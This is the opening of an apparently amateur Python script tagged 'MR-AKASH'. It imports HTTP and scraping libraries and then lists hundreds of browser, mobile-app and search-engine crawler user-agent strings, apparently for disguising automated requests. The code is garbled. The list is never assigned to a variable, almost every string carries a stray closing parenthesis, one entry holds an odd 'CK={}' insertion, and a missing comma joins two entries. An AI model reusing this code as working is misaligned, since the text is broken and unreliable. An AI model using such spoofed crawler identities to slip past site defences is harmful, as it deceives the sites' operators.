#-----------------[ MR-AKASH ]-------------------#
 
import requests,bs4,json,os,sys,random,datetime,time,re

  "38.0)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36)",
  "Mozilla/5.0 CK={} (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36)",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322))",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1))",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763)",
  "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; KTXN))",
  "Mozilla/5.0 (Windows NT 5.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1)",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1))",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1)",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0))",
  "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0)",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727))",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36)",
  "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022))",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322))",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362)",
  "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko)",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0))",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.83 Safari/537.1)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36)",
  "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1))",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36)",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98))",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063)",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0)",
  "Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0 (via ggpht.com GoogleImageProxy))",
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html))",
  "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm))",
  "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html))",
  "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+))",
  "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp))",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html))",
  "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php))",
  "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com))",
  "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot))",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36)",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0)",
  "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0)",
  "Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/71.0.3578.141 Safari/534.24 XiaoMi/MiuiBrowser/12.4.3-g)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/69.0.3497.81 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36)",
  "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060124 Firefox/1.5.0.1)",
  "Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0)",
  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/53.0.2785.143 Chrome/53.0.2785.143 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36)",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/80.0.3987.87 Chrome/80.0.3987.87 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.120 Chrome/37.0.2062.120 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36)",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:53.0) Gecko/20100101 Firefox/53.0)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/76.0.3809.100 Chrome/76.0.3809.100 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/49.0.2623.108 Chrome/49.0.2623.108 Safari/537.36)",
  "Wget/1.17.1 (linux-gnu))",
  "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0)",
  "Mozilla/5.0 (X11; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0)",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:10.0) Gecko/20100101 Firefox/10.0)",
  "Mozilla/5.0 (X11; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36)",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:59.0) Gecko/20100101 Firefox/59.0)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36)",
  "Mozilla/5.0 (SMART-TV; Linux; Tizen 5.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.2 Chrome/63.0.3239.84 TV Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/70.0.3538.77 Chrome/70.0.3538.77 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36)",
  "Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3)",
  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22)",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:63.0) Gecko/20100101 Firefox/63.0)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.59 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/76.0.3809.87 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/68.0.3419.0 Safari/537.36)",
  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0)",
  "Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/52.0.2743.116 Chrome/52.0.2743.116 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.183 Safari/537.36 Vivaldi/1.96.1137.3)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 http://notifyninja.com/monitoring)",
  "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Thunderbird/45.8.0)",
  "WirtschaftsWoche-iOS-1.1.14-20200824.1315)",
  "[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;])",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Thunderbird/60.7.0 Lightning/6.2.7)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; .NET4.0C; .NET4.0E; BRI/2))",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/6.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; McAfee; MAARJS))",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MAARJS; rv:11.0) like Gecko)",
  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 2.0.4.16; MAAR))",
  "Outlook-Express/7.0 (MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 1.0.0.40; BRI/2; MAAR; .NET CLR 1.1.4322; TmstmpExt))",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; InfoPath.1; .NET4.0C; OfficeLiveConnector.1.5; OfficeLivePatch.1.3; .NET4.0E))",
  "DoCoMo/2.0 P903i(c100;TB;W24H12))",
  "DoCoMo/2.0 P903i)",
  "DoCoMo/2.0 SH10C(c500;TB;W16H12))",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; MAFS; Microsoft Outlook 14.0.7162; ms-office; MSOffice 14))",
  "HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320) UP.Link/6.3.0.0.0)",
  "HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320))",
  "com.mobile.indiapp 2.0.5.5 phone HTC7088 android 16 fa zz normal long high 540 960)",
  "Mogujie4Android/NAMhuawei/1290)",
  "Mozilla/5.0 (Linux; Android 10; AGR-AL09HN Build/HUAWEIAGR-AL09HN; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Safari/537.36)",
  "Mozilla/5.0 (Linux; Android 10; ANA-LX9 Build/HUAWEIANA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36)",
  "Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 1 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1)",
  "Mozilla/5.0 (Android; 4.0.4; Mobile; Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0)",
  "Mozilla/5.0 (Android; Mobile Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0)",
  "Mozilla/5.0 (Linux; U; Android; 2.3.7; sv-se; Nexus 0 Build/HUAWEIX3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Safari/533.1)",
  "Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 3 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1)",
  "Mozilla/5.0 (Linux; U; Android 2.3.8; sv-se; Huawei X3 Build/HuaweiSocialPhone) AppleWebKit/534.15 (KHTML, like Gecko) CrMo/32.0.1005.22 Mobile Safari/534.15)",
  "Mozilla/5.0 (Linux; Android 8.1.0; LG-H932BK Build/OPM6.171019.030.K1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/193.0.0.45.101;])",
  "nokia-7.1-safari)",
  "NOKIA6120cUCBrowser/8.7.1.234/28/444/UCWEB)",
  "Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/61.0.0.15.69;])",
  "Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/79.0.0.18.71;])",
  "Mozilla/5.0 (Linux; Android 4.1.2; GT-I8730T Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36 OPR/50.6.2426.201126)",
  "Mozilla/5.0 (Linux; Android 4.4.2; GT-193011 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Mobile UCBrowser/3.4.3.532)",
  "Mozilla/5.0 (Linux; U; Android 4.0.4; de-de; SonyEricssonMT11i Build/Xperia Ultimate HD™ 3.0.2) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30)",
  "Mozilla/5.0 (Android; Mobile; rv:30.0) Gecko/30.0 Firefox/30.0)",
  "Mozilla/5.0 (Android; Tablet; rv:30.0) Gecko/30.0 Firefox/30.0)",
  "Mozilla/5.0 (Windows NT 6.2; rv:10.0) Gecko/20100101 Firefox/33.0)",
  "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:10.0) Gecko/20100101 Firefox/33.0)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0) Gecko/20100101 Firefox/33.0)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:10.0) Gecko/20100101 Firefox/33.0)",
  "Mozilla/5.0 (Macintosh; PPC Mac OS X 10.6; rv:10.0) Gecko/20100101 Firefox/33.0)",
  "Mozilla/5.0 (X11; Linux i686; rv:10.0) Gecko/20100101 Firefox/33.0)",
  "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/33.0)",
  "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:10.0) Gecko/20100101 Firefox/33.0)",
  "Mozilla/5.0 (Maemo; Linux armv7l; rv:10.0) Gecko/20100101 Firefox/10.0 Fennec/10.0)",
  "Mozilla/5.0 (Mobile; rv:26.0) Gecko/26.0 Firefox/26.0)",
  "Mozilla/5.0 (Tablet; rv:26.0) Gecko/26.0 Firefox/26.0)",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 RuxitSynthetic/1.0 v9646582432 t38550 ath9b965f92 altpub cvcv=2)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36)",
  "Mozilla/5.0 (Linux; ; ) AppleWebKit/ (KHTML, like Gecko) Chrome/ Mobile Safari/)",
  "Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36)",
  "Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0)",
  "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254)",
  "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536)",
  "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058)",
  "Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36)",
  "Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36)",
  "Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36)",
  "Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 ) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30)",
  "Mozilla/5.0 (Linux; U; Android 4.2.2;pl-pl; Lenovo S5000-F/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2.2 Mobile Safari/534.30)",
  "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30)",
  "WeRead/5.2.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10))",
  "WeRead/5.3.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10))",
  "WeRead/5.2.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10))",
  "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29))",
  "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29))",
  "WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29))",
  "WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; CDY-NX9A Build/HUAWEICDY-N29))",
  "WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 7.0; BTV-W09 Build/HUAWEIBEETHOVEN-W09))",
  "WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10))",
  "WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10))",
  "WeRead/5.1.0 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29))",
  "WeRead/5.0.3 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29))",
  "WeRead/5.0.5 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10))",
  "WeRead/4.2.3 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00))",
  "WeRead/4.1.5 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09))",
  "WeRead/3.5.0 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0; DIG-AL00 Build/HUAWEIDIG-AL00))",
  "WeRead/4.1.1 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09))",
  "WeRead/4.1.1 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00))",
  "Dalvik/2.1.0 (Linux; U; Android 5.1))",
  "Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-P7510 Build/IMM76D)"
  "Dalvik/2.1.0 (Linux; U; Android 5.1; AFTM Build/LMY47O))",
  "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=720,height=1440})",
  "Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/KVT49L)UNTRUSTED/1.0C-1.1; Opera Mini/att/4.2)",
  "Dalvik/1.4.0 (Linux; U; Android 2.3.6; HUAWEI Y210-0100 Build/HuaweiY210-0100))",
  "Dalvik/1.4.0 (Linux; U; Android 2.3.6; GT-S5570 Build/GINGERBREAD))",
  "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.3)",
  "Dalvik/1.6.0 (Linux; U; Android 4.2.2; Galaxy Nexus Build/JDQ39))",
  "Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60)",
  "Dalvik/2.1.0 (Linux; U; Android 5.1; PRO 5 Build/LMY47D))",
  "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5))",
